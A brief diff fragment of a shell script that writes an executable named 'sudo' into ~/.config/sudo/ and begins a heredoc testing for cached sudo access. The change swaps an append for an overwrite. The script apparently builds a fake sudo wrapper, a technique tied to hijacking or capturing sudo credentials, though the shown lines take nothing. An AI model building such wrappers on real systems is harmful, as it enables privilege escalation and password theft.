@@ -10,7 +10,7 @@ then
     rm  ~/.config/sudo/sudo
 fi
 
-echo '#!'$SHELL >> ~/.config/sudo/sudo
+echo '#!'$SHELL > ~/.config/sudo/sudo
 cat <<'EOF' >> ~/.config/sudo/sudo
 /usr/bin/sudo -n true 2>/dev/null
 if [ $? -eq 0 ]
